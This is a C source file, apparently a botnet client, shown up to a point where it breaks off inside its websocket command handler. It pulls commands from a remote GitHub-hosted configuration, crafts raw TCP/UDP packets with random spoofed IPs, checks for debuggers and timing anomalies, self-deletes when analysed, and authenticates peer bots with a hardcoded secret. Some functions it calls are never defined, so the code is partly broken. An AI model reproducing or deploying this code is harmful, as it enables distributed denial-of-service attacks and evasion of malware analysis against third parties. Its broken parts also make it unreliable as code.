#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>
#include <errno.h>
#include <curl/curl.h>
#include <pthread.h>
#include <time.h>
#include <ctype.h>
#include <sys/stat.h>
#include <cjson/cJSON.h>
#include <sys/wait.h>
#include <libwebsockets.h>
#include <mbedtls/sha256.h>
#include <mbedtls/base64.h>
#include <curl/curl.h>
#include <jansson.h>
#include <unistd.h>
#include <openssl/sha.h>
#ifdef _WIN32
#include <windows.h>
#else
#include <sys/mman.h>
#include <sys/ptrace.h>
#include <fcntl.h>
#endif

#define C2_URL "https://raw.githubusercontent.com/UnknowWAKAN/Cloudflare-notflare/refs/heads/main/configrouter.json"
#define UA_URL "https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt"
#define CONFIG_FILE "configrouter.json"
#define C2_INTERVAL 60
#define MAX_THREADS 200
#define MAX_PACKET_SIZE 65535
#define MAX_UA 1000
#define MAX_UA_LEN 256
#define MAX_JSON_LEN 4096
#define MAX_TARGET_LEN 256
#define MAX_CMD_LEN 512
#define MAX_CHILDREN 50
#define GRANULARITY (5 * 60)
#define MAX_PEERS 10
#define MAX_BOTS 100
#define MAX_COMMAND_ID_LEN 16
#define MAX_BOT_ID_LEN 32
#define MAX_NONCE_LEN 32
#define SHARED_SECRET "54641334935446203874303211634346055952839888385725556492075124583111955819553"
#define KEY_LEN 32
#define MULTICAST_GROUP "239.255.0.1"
#define MULTICAST_PORT 5007
#define MAX_BUFFER 1024
#define MAX_NONCES 1000
#define HASH_LEN 65
#define BUFFER_SIZE 8192
#define MAX_PATH 4096
#define TIMING_THRESHOLD 0.1
#define CODE_SECTION_SIZE 2048
#define HASH_PARTS 4
#define INTERVAL_US 1000
#define NUM_ITERATIONS 5000
#define LATENCY_THRESHOLD 100
#define WEIGHT_THRESHOLD 50
#define DELAY_SECONDS 180

int parse_json(const char* json, char* command, char* target, int* port, int* duration, int* connections);

unsigned char MASTER_SEED_HASH[KEY_LEN] = {0};

typedef struct {
    int success;
    char error_msg[256];
} IntegrityResult;

static int integrity_checked = 0;
static const char x0[65] = "0000000000000000000000000000000000000000000000000000000000000000";

void delay_and_delete(const char *path) {
    int dummy = 0;
    time_t start = time(NULL);
    while (time(NULL) - start < DELAY_SECONDS) {
        #ifdef _WIN32
        Sleep(1000);
        #else
        struct timespec req = {1, 0}, rem;
        nanosleep(&req, &rem);
        #endif
        for (int i = 0; i < 1000; i++) {
            dummy ^= i * (i % 13);
        }
    }
    remove(path);
}

unsigned long generate_stack_canary(unsigned char *key) {
    unsigned long seed = (unsigned long)rand() ^ (unsigned long)&generate_stack_canary;
    return seed ^ *(unsigned long *)key;
}

void generate_key(unsigned char *key, size_t key_len, unsigned long checksum3, long max_latency, int weight_score) {
    if (!key || key_len < SHA256_DIGEST_LENGTH) return;
    time_t timestamp = time(NULL);
    pid_t pid = getpid();                                                                                                 char *user = getenv("USER");
    if (!user) user = "";
    unsigned long stack_canary = (unsigned long)&timestamp;
    unsigned long entropy = (unsigned long)&key ^ (unsigned long)rand() ^ checksum3 ^ max_latency ^ weight_score;

    SHA256_CTX ctx;
    SHA256_Init(&ctx);
    SHA256_Update(&ctx, &timestamp, sizeof(timestamp));
    SHA256_Update(&ctx, &pid, sizeof(pid));
    SHA256_Update(&ctx, user, strlen(user));
    SHA256_Update(&ctx, &stack_canary, sizeof(stack_canary));
    SHA256_Update(&ctx, &entropy, sizeof(entropy));
    SHA256_Final(key, &ctx);
}

void dual_xor_memory(void *data, size_t len, unsigned char key1, unsigned char key2) {
    if (!data || len > MAX_PATH) return;
    unsigned char *ptr = (unsigned char *)data;
    for (size_t i = 0; i < len; i++) {
        ptr[i] ^= key1;
        ptr[i] ^= key2;
    }
}

void scramble_memory(char *data, size_t len) {
    for (size_t i = 0; i < len / 2; i++) {
        char temp = data[i];
        data[i] = data[len - 1 - i];
        data[len - 1 - i] = temp;
    }
}

int detect_hardware_breakpoint() {
    #ifdef _WIN32
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    GetThreadContext(GetCurrentThread(), &ctx);
    if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) {
        return 1;
    }
    #else
    char buf[1024];
    int fd = open("/proc/self/status", O_RDONLY);
    if (fd != -1) {
        ssize_t n = read(fd, buf, sizeof(buf) - 1);
        close(fd);
        if (n > 0) {
            buf[n] = '\0';
            if (strstr(buf, "TracerPid:\t0") == NULL) {
                return 1;
            }
        }
    }
    #endif
    return 0;
}

int detect_breakpoint(void *start, size_t size) {
    unsigned char *ptr = (unsigned char *)start;
    for (size_t i = 0; i < size; i++) {
        if (ptr[i] == 0xCC) return 1;
    }
    return 0;
}

int check_mmu() {
    #ifdef _WIN32
    MEMORY_BASIC_INFORMATION mbi;
    if (VirtualQuery((void *)check_mmu, &mbi, sizeof(mbi)) == 0) {
        return 1;
    }
    if (!(mbi.Protect & (PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE))) {
        return 1;
    }
    #else
    char buf[4096];
    int fd = open("/proc/self/maps", O_RDONLY);
    if (fd == -1) return 1;
    ssize_t n = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (n <= 0) return 1;
    buf[n] = '\0';
    char *line = strstr(buf, "r-xp");
    if (!line) return 1;
    #endif
    return 0;
}

long check_latency() {
    #ifndef _WIN32
    struct timespec expected, actual;
    long diff_ns;
    long max_latency = 0;

    if (clock_gettime(CLOCK_MONOTONIC, &expected) == -1) {
        return LATENCY_THRESHOLD + 1;
    }

    for (int i = 0; i < NUM_ITERATIONS; i++) {
        expected.tv_nsec += (INTERVAL_US * 1000);
        if (expected.tv_nsec >= 1000000000) {
            expected.tv_sec++;
            expected.tv_nsec -= 1000000000;
        }
        clock_nanosleep(CLOCK_MONOTONIC, TIMER_ABSTIME, &expected, NULL);
        clock_gettime(CLOCK_MONOTONIC, &actual);
        diff_ns = (actual.tv_sec - expected.tv_sec) * 1000000000 +
                  (actual.tv_nsec - expected.tv_nsec);
        if (diff_ns > max_latency) {
            max_latency = diff_ns;
        }
    }
    return max_latency;
    #else
    return LATENCY_THRESHOLD + 1;
    #endif
}

unsigned long calculate_code_checksum(void *start, size_t size, int mode) {
    unsigned long checksum = 0;
    unsigned char *ptr = (unsigned char *)start;
    for (size_t i = 0; i < size; i++) {
        if (mode == 0) checksum += ptr[i] ^ (i % 256);
        else if (mode == 1) checksum += ptr[i] + i;
        else checksum = (checksum + ptr[i] * (i % 256)) % 0xFFFF;
    }
    return checksum;
}

void unpack_code_section(void *start, size_t size, unsigned char key) {
    #ifndef _WIN32
    if (mprotect((void *)((unsigned long)start & ~(4096 - 1)), 4096, PROT_READ | PROT_WRITE | PROT_EXEC) == -1) {
        return;
    }
    #endif
    xor_memory(start, size, key);
}

int validate_data(const char *hash, long file_size, time_t timestamp, char *error) {
    if (!hash || strlen(hash) != HASH_LEN - 1) {
        snprintf(error, 256, "Invalid hash length");
        return 0;
    }
    if (file_size <= 0) {
        snprintf(error, 256, "Invalid file size");
        return 0;
    }
    time_t now = time(NULL);
    if (timestamp > now || timestamp < now - 3600) {
        snprintf(error, 256, "Invalid timestamp");
        return 0;
    }
    return 1;
}

typedef struct {
    char command_id[MAX_COMMAND_ID_LEN];
} ProcessedCommand;

typedef struct {
    char command_id[MAX_COMMAND_ID_LEN];
    char bot_ids[MAX_BOTS][MAX_BOT_ID_LEN];
    int bot_count;
} CommandStatus;

typedef struct {
    char nonce[MAX_NONCE_LEN];
    time_t timestamp;
} UsedNonce;

ProcessedCommand processed_commands[100];
CommandStatus command_status[100];
UsedNonce used_nonces[MAX_NONCES];
int processed_count = 0;
int command_count = 0;
int nonce_count = 0;
struct lws *peer_connections[MAX_PEERS];
char bot_id[MAX_BOT_ID_LEN];
char ip[32] = "127.0.0.1";
int ip_fetched = 0;
int own_port;

struct pseudo_header {
    uint32_t source_address;
    uint32_t dest_address;
    uint8_t placeholder;
    uint8_t protocol;
    uint16_t length;
};

struct write_callback_data {
    char* buffer;
    size_t used;
    size_t max;
};

char user_agents[MAX_UA][MAX_UA_LEN];
int user_agent_count = 0;

size_t write_callback(void *contents, size_t size, size_t nmemb, struct write_callback_data *userp) {
    size_t realsize = size * nmemb;
    struct write_callback_data *data = (struct write_callback_data *)userp;
    if (data->used + realsize >= data->max) {
        size_t new_max = data->max ? data->max * 2 : MAX_BUFFER;
        while (new_max < data->used + realsize + 1) new_max *= 2;

        char *new_buffer = realloc(data->buffer, new_max);
        if (!new_buffer) return 0;

        data->buffer = new_buffer;
        data->max = new_max;
    }
    memcpy(data->buffer + data->used, contents, realsize);
    data->used += realsize;
    data->buffer[data->used] = '\0';

    return realsize;
}

size_t write_file_callback(void* ptr, size_t size, size_t nmemb, FILE* stream) {
    return fwrite(ptr, size, nmemb, stream);
}

int fetch_ip_geo(char *ip, size_t ip_len) {
    if (ip_len < 32) return -1;
    CURL *curl = curl_easy_init();
    if (!curl) return -1;

    char *response = malloc(1); response[0] = 0;
    curl_easy_setopt(curl, CURLOPT_URL, "http://ip-api.com/json/");
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback1);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
    CURLcode res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);

    if (res != CURLE_OK) {
        free(response);
        return -1;
    }

    json_error_t error;
    json_t *root = json_loads(response, 0, &error);
    free(response);
    if (!root) return -1;

    json_t *query = json_object_get(root, "query");
    if (json_is_string(query)) {
        strncpy(ip, json_string_value(query), ip_len - 1);
        ip[ip_len - 1] = 0;
    }
    json_decref(root);
    return 0;
}

int calculate_file_hash(const char *path, char *hash, long *file_size, time_t *timestamp, char *error) {
    unsigned long canary = 0;
    unsigned char key[SHA256_DIGEST_LENGTH];
    unsigned long checksum3 = calculate_code_checksum((void *)main, CODE_SECTION_SIZE, 2);
    long max_latency = check_latency();
    generate_key(key, SHA256_DIGEST_LENGTH, checksum3, max_latency, 0);
    canary = generate_stack_canary(key);

    if (!path || !hash || !file_size || !timestamp || !error) {
        snprintf(error, 256, "Invalid parameters");
        return 0;
    }

    FILE *file = fopen(path, "rb");
    if (!file) {
        snprintf(error, 256, "Cannot open file: %s", path);
        return 0;
    }

    unpack_code_section((void *)calculate_file_hash, CODE_SECTION_SIZE, key[0]);

    mbedtls_sha256_context ctx;
    unsigned char buffer[BUFFER_SIZE];
    size_t bytes_read;
    long offset = -1, current_pos = 0;
    int state = 0, dummy = 0;

    *file_size = 0;
    *timestamp = time(NULL);
    mbedtls_sha256_init(&ctx);
    mbedtls_sha256_starts(&ctx, 0);

    __asm__("nop; nop; nop;");

    while (1) {
        switch (state) {
            case 0: {
                FILE *search = fopen(path, "rb");
                if (!search) {
                    snprintf(error, 256, "Cannot open file for searching: %s", path);
                    fclose(file);
                    mbedtls_sha256_free(&ctx);
                    return 0;
                }
                char temp[HASH_LEN];
                unsigned char c;
                while (fread(&c, 1, 1, search) == 1) {
                    if (c == '0') {
                        long pos = ftell(search) - 1;
                        fseek(search, pos, SEEK_SET);
                        if (fread(temp, 1, HASH_LEN - 1, search) == HASH_LEN - 1) {
                            temp[HASH_LEN - 1] = '\0';
                            if (strcmp(temp, x0) == 0) {
                                offset = pos;
                                break;
                            }
                        }
                        fseek(search, pos + 1, SEEK_SET);
                    }
                }
                fseek(search, 0, SEEK_END);
                *file_size = ftell(search);
                fclose(search);
                state = 1;
                break;
            }
            case 1:
                bytes_read = fread(buffer, 1, BUFFER_SIZE, file);
                if (bytes_read == 0) {
                    state = 3;
                    break;
                }
                for (int i = 0; i < 100; i++) dummy += i ^ (i % 3);
                if (offset >= 0) {
                    long chunk_start = current_pos;
                    long chunk_end = current_pos + bytes_read;
                    if (chunk_start <= offset && chunk_end > offset) {
                        long before = offset - chunk_start;
                        long after = offset + (HASH_LEN - 1) - chunk_start;
                        if (before > 0) mbedtls_sha256_update(&ctx, buffer, before);
                        if (after < (long)bytes_read) mbedtls_sha256_update(&ctx, buffer + after, bytes_read - after);
                    } else if (chunk_end <= offset || chunk_start >= offset + (HASH_LEN - 1)) {
                        mbedtls_sha256_update(&ctx, buffer, bytes_read);
                    }
                } else {
                    mbedtls_sha256_update(&ctx, buffer, bytes_read);
                }
                current_pos += bytes_read;
                state = 2;
                break;
            case 2:
                dummy ^= (dummy % 7);
                state = 1;
                break;
            case 3:
                mbedtls_sha256_update(&ctx, (unsigned char *)file_size, sizeof(*file_size));
                mbedtls_sha256_update(&ctx, (unsigned char *)timestamp, sizeof(*timestamp));
                if (check_mmu()) {
                    snprintf(error, 256, "MMU tampering detected");
                    fclose(file);
                    mbedtls_sha256_free(&ctx);
                    return 0;
                }
                unsigned char temp[SHA256_DIGEST_LENGTH];
                mbedtls_sha256_finish(&ctx, temp);
                fclose(file);
                mbedtls_sha256_free(&ctx);
                char hash_parts[HASH_PARTS][HASH_LEN / HASH_PARTS + 1];
                for (int i = 0; i < SHA256_DIGEST_LENGTH; i++) {
                    snprintf(hash_parts[i % HASH_PARTS] + (i / HASH_PARTS * 2), 3, "%02x", temp[i]);
                }
                for (int i = 0; i < HASH_PARTS; i++) {
                    strncpy(hash + i * (HASH_LEN / HASH_PARTS), hash_parts[i], HASH_LEN / HASH_PARTS);
                }
                hash[HASH_LEN - 1] = '\0';
                scramble_memory(hash, HASH_LEN - 1);
                dual_xor_memory(hash, HASH_LEN - 1, key[0], key[1]);
                if (!validate_data(hash, *file_size, *timestamp, error)) {
                    return 0;
                }
                unpack_code_section((void *)calculate_file_hash, CODE_SECTION_SIZE, key[0]);
                if (canary != generate_stack_canary(key)) return 0;
                return 1;
        }
    }
}

IntegrityResult verify_integrity(const char *path) {
    unsigned long canary = 0;
    unsigned char key[SHA256_DIGEST_LENGTH];
    unsigned long checksum3 = calculate_code_checksum((void *)main, CODE_SECTION_SIZE, 2);
    long max_latency = check_latency();
    int weight_score = 0;
    generate_key(key, SHA256_DIGEST_LENGTH, checksum3, max_latency, weight_score);
    canary = generate_stack_canary(key);
    IntegrityResult result = {0, ""};
    if (!path || strlen(path) >= MAX_PATH) {
        snprintf(result.error_msg, 256, "Invalid or too long path");
        return result;
    }

    struct stat st;
    if (stat(path, &st) != 0) {
        snprintf(result.error_msg, 256, "File does not exist: %s", path);
        return result;
    }

    if (integrity_checked) {
        snprintf(result.error_msg, 256, "Integrity already checked");
        return result;
    }
    integrity_checked = 1;

    #ifdef _WIN32
    if (IsDebuggerPresent()) {
        weight_score += 30;
    }
    #else
    if (ptrace(PTRACE_TRACEME, 0, 1, 0) == -1) {
        weight_score += 30;
    }
    #endif

    int dummy = 0;
    for (int i = 0; i < 1000; i++) {
        dummy ^= i % 17;
        if (i == 500) {
            #ifdef _WIN32
            BOOL debugged = FALSE;
            CheckRemoteDebuggerPresent(GetCurrentProcess(), &debugged);
            if (debugged) {
                weight_score += 30;
            }
            #else
            if (detect_hardware_breakpoint()) {
                weight_score += 30;
            }
            #endif
        }
    }

    if (max_latency < LATENCY_THRESHOLD) {
        weight_score += 20;
    }

    if (detect_breakpoint((void *)verify_integrity, CODE_SECTION_SIZE)) {
        weight_score += 10;
    }

    unsigned long checksum1 = calculate_code_checksum((void *)verify_integrity, CODE_SECTION_SIZE, 0);
    static unsigned long expected_checksum1 = 0;
    if (expected_checksum1 == 0) {
        expected_checksum1 = checksum1;
    } else if (checksum1 != expected_checksum1) {
        weight_score += 10;
    }


    unsigned long checksum2 = calculate_code_checksum((void *)calculate_file_hash, CODE_SECTION_SIZE, 1);
    static unsigned long expected_checksum2 = 0;
    if (expected_checksum2 == 0) {
        expected_checksum2 = checksum2;
    } else if (checksum2 != expected_checksum2) {
        weight_score += 10;
    }


    if (checksum3 != calculate_code_checksum((void *)main, CODE_SECTION_SIZE, 2)) {
        weight_score += 10;
    }


    char *user = getenv("USER");
    if (!user || strlen(user) == 0) {
        weight_score += 10;
    }


    if (check_mmu()) {
        weight_score += 10;
    }


    if (weight_score >= WEIGHT_THRESHOLD) {
        snprintf(result.error_msg, 256, "Debugging detected (weight: %d)", weight_score);
        delay_and_delete(path);
        return result;
    }


    clock_t start = clock();
    char current_hash[HASH_LEN];
    long file_size;
    time_t timestamp;
    if (!calculate_file_hash(path, current_hash, &file_size, &timestamp, result.error_msg)) {
        delay_and_delete(path);
        return result;
    }
    dual_xor_memory(current_hash, HASH_LEN - 1, key[0], key[1]);
    scramble_memory(current_hash, HASH_LEN - 1);
    clock_t end = clock();
    double time_spent = (double)(end - start) / CLOCKS_PER_SEC;
    if (time_spent > TIMING_THRESHOLD) {
        snprintf(result.error_msg, 256, "Execution too slow, possible debugging");
        delay_and_delete(path);
        return result;
    }


    #ifndef _WIN32
    if (mprotect((void *)((unsigned long)x0 & ~(4096 - 1)), 4096, PROT_READ | PROT_WRITE) == -1) {
        snprintf(result.error_msg, 256, "Cannot modify memory");
        return result;
    }
    #endif
    dual_xor_memory((char *)x0, HASH_LEN - 1, key[0], key[1]);


    if (strspn(x0, "0") == HASH_LEN - 1) {
        dual_xor_memory((char *)x0, HASH_LEN - 1, key[0], key[1]);
        result.success = 1;
        if (canary != generate_stack_canary(key)) return result;
        return result;
    }


    char expected_hash[HASH_LEN];
    SHA256_CTX ctx;
    SHA256_Init(&ctx);
    SHA256_Update(&ctx, &file_size, sizeof(file_size));
    SHA256_Update(&ctx, &timestamp, sizeof(timestamp));
    SHA256_Update(&ctx, &checksum3, sizeof(checksum3));
    SHA256_Update(&ctx, &max_latency, sizeof(max_latency));
    unsigned char temp[SHA256_DIGEST_LENGTH];
    SHA256_Final(temp, &ctx);
    for (int i = 0; i < SHA256_DIGEST_LENGTH; i++) {
        snprintf(expected_hash + (i * 2), 3, "%02x", temp[i]);
    }
    expected_hash[HASH_LEN - 1] = '\0';


    if (strcmp(current_hash, expected_hash) != 0) {
        snprintf(result.error_msg, 256, "Integrity check failed (hash mismatch)");
        delay_and_delete(path);
        return result;
    }


    int state = 0, dummy2 = 0;
    char temp_hash[HASH_LEN];
    strcpy(temp_hash, current_hash);
    while (state < 2) {
        switch (state) {
            case 0:
                for (int i = 0; i < 100; i++) dummy2 += i ^ (i % 5);
                state = 1;
                break;
            case 1:
                if (strcmp(temp_hash, expected_hash) != 0) {
                    snprintf(result.error_msg, 256, "Integrity check failed (second hash mismatch)");
                    delay_and_delete(path);
                    return result;
                }
                state = 2;
                break;
        }
    }


    if (!validate_data(current_hash, file_size, timestamp, result.error_msg)) {
        delay_and_delete(path);
        return result;
    }


    dual_xor_memory((char *)x0, HASH_LEN - 1, key[0], key[1]);

    result.success = 1;
    if (canary != generate_stack_canary(key)) return result;
    return result;
}

int fetch_user_agents() {
    CURL* curl = curl_easy_init();
    if (!curl) return 0;
    char* buffer = malloc(8192);
    if (!buffer) {
        curl_easy_cleanup(curl);
        return 0;
    }

    struct write_callback_data data = {buffer, 0, 8192};
    curl_easy_setopt(curl, CURLOPT_URL, UA_URL);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &data);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10);
    CURLcode res = curl_easy_perform(curl);
    if (res == CURLE_OK) {
        char* line = strtok(buffer, "\n");
        while (line && user_agent_count < MAX_UA) {
            if (strlen(line) < MAX_UA_LEN) {
                strncpy(user_agents[user_agent_count], line, MAX_UA_LEN - 1);
                user_agents[user_agent_count][MAX_UA_LEN - 1] = '\0';
                user_agent_count++;
            }
            line = strtok(NULL, "\n");
        }
    }
    free(buffer);
    curl_easy_cleanup(curl);
    if (user_agent_count == 0) {
        strncpy(user_agents[0], "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36", MAX_UA_LEN - 1);
        user_agent_count = 1;
    }
    return user_agent_count;
}

char* fetch_data_from_url() {
    CURL* curl = curl_easy_init();
    char* buffer = malloc(MAX_JSON_LEN);
    if (!curl || !buffer) {
        free(buffer);
        return NULL;
    }

    struct write_callback_data data = {buffer, 0, MAX_JSON_LEN};
    int retries = 3;
    CURLcode res = CURLE_FAILED_INIT;
    while (retries-- > 0) {
        memset(buffer, 0, MAX_JSON_LEN);
        data.used = 0;
        curl_easy_setopt(curl, CURLOPT_URL, C2_URL);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &data);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10);
        curl_easy_setopt(curl, CURLOPT_USERAGENT, user_agents[rand() % user_agent_count]);
        struct curl_slist* headers = NULL;
        headers = curl_slist_append(headers, "Accept: application/json");
        headers = curl_slist_append(headers, "Connection: keep-alive");
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        res = curl_easy_perform(curl);
        curl_slist_free_all(headers);
        if (res == CURLE_OK) break;
        sleep(2);
    }

    curl_easy_cleanup(curl);
    if (res != CURLE_OK) {
        free(buffer);
        return NULL;
    }
    return buffer;
}

unsigned short in_chksum(unsigned short* addr, int len) {
    int sum = 0;
    while (len > 1) {
        sum += *addr++;
        len -= 2;
    }
    if (len == 1) {
        sum += *(unsigned char*)addr;
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

unsigned short tcp_checksum(struct pseudo_header psh, struct tcphdr* tcph, char* data, int data_len) {
    int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + data_len;
    char* pseudogram = malloc(psize);
    if (!pseudogram) return 0;
    memcpy(pseudogram, &psh, sizeof(struct pseudo_header));
    memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr));
    if (data_len > 0) {
        memcpy(pseudogram + sizeof(struct pseudo_header) + sizeof(struct tcphdr), data, data_len);
    }
    unsigned short check = in_chksum((unsigned short*)pseudogram, psize);
    free(pseudogram);
    return check;
}

unsigned short udp_checksum(struct pseudo_header psh, struct udphdr* udph, char* data, int data_len) {
    int psize = sizeof(struct pseudo_header) + sizeof(struct udphdr) + data_len;
    char* pseudogram = malloc(psize);
    if (!pseudogram) return 0;
    memcpy(pseudogram, &psh, sizeof(struct pseudo_header));
    memcpy(pseudogram + sizeof(struct pseudo_header), udph, sizeof(struct udphdr));
    if (data_len > 0) {
        memcpy(pseudogram + sizeof(struct pseudo_header) + sizeof(struct udphdr), data, data_len);
    }
    unsigned short check = in_chksum((unsigned short*)pseudogram, psize);
    free(pseudogram);
    return check;
}

void timeout(int signum) {
    if (signum == SIGALRM) {
        close(0);
        curl_global_cleanup();
        exit(0);
    }
}

int is_reserved_ip(uint32_t ip) {
    uint8_t* bytes = (uint8_t*)&ip;
    if (bytes[0] == 10) return 1;
    if (bytes[0] == 172 && bytes[1] >= 16 && bytes[1] <= 31) return 1;
    if (bytes[0] == 192 && bytes[1] == 168) return 1;
    if (bytes[0] == 127) return 1;
    if (bytes[0] >= 224) return 1;
    return 0;
}

char* random_ip() {
    static char ip_str[16];
    uint32_t ip;
    do {
        ip = (rand() % 256) << 24 | (rand() % 256) << 16 | (rand() % 256) << 8 | (rand() % 256);
    } while (is_reserved_ip(ip));
    snprintf(ip_str, sizeof(ip_str), "%d.%d.%d.%d",
             (ip >> 24) & 0xFF, (ip >> 16) & 0xFF, (ip >> 8) & 0xFF, ip & 0xFF);
    return ip_str;
}

void sanitize_command(char* dest, const char* src, size_t max_len) {
    size_t i = 0, j = 0;
    while (src[i] && j < max_len - 1) {
        if (isalnum(src[i]) || src[i] == '/' || src[i] == '.' || src[i] == '_' || src[i] == '-') {
            dest[j++] = src[i];
        }
        i++;
    }
    dest[j] = '\0';
}

void get_ip_prefix(char *ip, char *ip_prefix, size_t prefix_len) {
    if (prefix_len < 32) return;
    char *dot = strrchr(ip, '.');
    if (dot) {
        size_t len = dot - ip;
        if (len >= prefix_len - 5) len = prefix_len - 5;
        strncpy(ip_prefix, ip, len);
        ip_prefix[len] = 0;
        strncat(ip_prefix, ".0/24", prefix_len - len - 1);
    } else {
        strncpy(ip_prefix, ip, prefix_len - 1);
        ip_prefix[prefix_len - 1] = 0;
    }
}

void get_utc_round_iso(time_t ts, char *time_iso, size_t time_len) {
    if (time_len < 32) return;
    ts = (ts / GRANULARITY) * GRANULARITY;
    struct tm *tm = gmtime(&ts);
    strftime(time_iso, time_len, "%Y-%m-%dT%H:%M:%SZ", tm);
}

void generate_master_key(time_t timestamp, unsigned char *master_key) {
    long interval = timestamp / (60 * 60);
    char msg[32];
    snprintf(msg, sizeof(msg), "%ld", interval);
    mbedtls_sha256_context ctx;
    mbedtls_sha256_init(&ctx);
    mbedtls_sha256_starts(&ctx, 0);
    mbedtls_sha256_update(&ctx, MASTER_SEED_HASH, KEY_LEN);
    mbedtls_sha256_update(&ctx, (unsigned char *)msg, strlen(msg));
    mbedtls_sha256_finish(&ctx, master_key);
    mbedtls_sha256_free(&ctx);
}

void derive_key(const char *bot_id, const char *ip, time_t ts, unsigned char *key) {
    unsigned char master_key[32];
    generate_master_key(ts, master_key);

    char ip_prefix[32];
    char time_iso[32];
    get_ip_prefix(ip, ip_prefix, sizeof(ip_prefix));
    get_utc_round_iso(ts, time_iso, sizeof(time_iso));

    char context[256];
    snprintf(context, sizeof(context), "client=%s|ip_pref=%s|time=%s", bot_id, ip_prefix, time_iso);

    mbedtls_sha256_context ctx;
    mbedtls_sha256_init(&ctx);
    mbedtls_sha256_starts(&ctx, 0);
    mbedtls_sha256_update(&ctx, master_key, 32);
    mbedtls_sha256_update(&ctx, (unsigned char *)context, strlen(context));
    mbedtls_sha256_finish(&ctx, key);
    mbedtls_sha256_free(&ctx);
}

int verify_signature(const char *bot_id, const char *ip, time_t ts, const char *nonce, size_t nonce_len, const char *client_sig_b64) {
    if (!bot_id || !ip || !nonce || !client_sig_b64 || nonce_len > MAX_NONCE_LEN) return 0;
    for (int i = 0; i < nonce_count; i++) {
        if (strncmp(used_nonces[i].nonce, nonce, MAX_NONCE_LEN) == 0 && time(NULL) - used_nonces[i].timestamp < 3600) {
            return 0;
        }
    }

    unsigned char key[KEY_LEN];
    for (int offset = -GRANULARITY; offset <= GRANULARITY; offset += GRANULARITY) {
        derive_key(bot_id, ip, ts + offset, key);
        unsigned char expected[32];
        mbedtls_sha256_context ctx;
        mbedtls_sha256_init(&ctx);
        mbedtls_sha256_starts(&ctx, 0);
        mbedtls_sha256_update(&ctx, key, KEY_LEN);
        mbedtls_sha256_update(&ctx, (unsigned char *)nonce, nonce_len);
        mbedtls_sha256_finish(&ctx, expected);
        mbedtls_sha256_free(&ctx);

        unsigned char client_sig[32];
        size_t sig_len = 0;
        if (mbedtls_base64_decode(client_sig, 32, &sig_len, (unsigned char *)client_sig_b64, strlen(client_sig_b64)) != 0) {
            return 0;
        }
        if (memcmp(expected, client_sig, 32) == 0) {
            if (nonce_count < MAX_NONCES) {
                strncpy(used_nonces[nonce_count].nonce, nonce, MAX_NONCE_LEN - 1);
                used_nonces[nonce_count].nonce[MAX_NONCE_LEN - 1] = 0;
                used_nonces[nonce_count].timestamp = time(NULL);
                nonce_count++;
            }
            return 1;
        }
    }
    return 0;
}

int callback_websocket(struct lws *wsi, enum lws_callback_reasons reason, void *user, void *in, size_t len) {
    if (!ip_fetched) {
        fetch_ip_geo(ip, sizeof(ip));
        ip_fetched = 1;
    }

    switch (reason) {
        case LWS_CALLBACK_RECEIVE: {
            if (len > MAX_BUFFER) return -1;
            json_error_t error;
            json_t *root = json_loadb(in, len, 0, &error);
            if (!root) return 0;

            const char *type = json_string_value(json_object_get(root, "type"));
            if (type && strcmp(type, "challenge") == 0) {
                const char *nonce = json_string_value(json_object_get(root, "nonce"));
                if (!nonce || strlen(nonce) > MAX_NONCE_LEN) {
                    json_decref(root);
                    return 0;
                }
                unsigned char key[KEY_LEN];
                derive_key(bot_id, ip, time(NULL), key);
                unsigned char sig[32];
                mbedtls_sha256_context ctx;
                mbedtls_sha256_init(&ctx);
                mbedtls_sha256_starts(&ctx, 0);
                mbedtls_sha256_update(&ctx, key, KEY_LEN);
                mbedtls_sha256_update(&ctx, (unsigned char *)nonce, strlen(nonce));
                mbedtls_sha256_finish(&ctx, sig);
                mbedtls_sha256_free(&ctx);

                char sig_b64[64];
                size_t sig_len = 0;
                mbedtls_base64_encode((unsigned char *)sig_b64, sizeof(sig_b64), &sig_len, sig, 32);

                char response[256];
                snprintf(response, sizeof(response), "{\"type\":\"challenge_response\",\"bot_id\":\"%s\",\"sig\":\"%s\"}", bot_id, sig_b64);
                lws_write(wsi, (unsigned char *)response, strlen(response), LWS_WRITE_TEXT);
            } else if (type && strcmp(type, "challenge_response") == 0) {
                const char *peer_bot_id = json_string_value(json_object_get(root, "bot_id"));
                const char *sig = json_string_value(json_object_get(root, "sig"));
                char *nonce = (char *)user;
                if (peer_bot_id && sig && nonce && verify_signature(peer_bot_id, ip, time(NULL), nonce, strlen(nonce), sig)) {
                    printf("Bot %s authenticated peer %s\n", bot_id, peer_bot_id);
                } else {
                    lws_close_reason(wsi, LWS_CLOSE_STATUS_PROTOCOL_ERR, NULL, 0);
                }
                free(nonce);
            } else if (type && strcmp(type, "command") == 0) {
                const char *command_id = json_string_value(json_object_get(root, "command_id"));
                const char *sender_id = json_string_value(json_object_get(root, "sender_id"));
                const char *nonce = json_string_value(json_object_get(root, "nonce"));
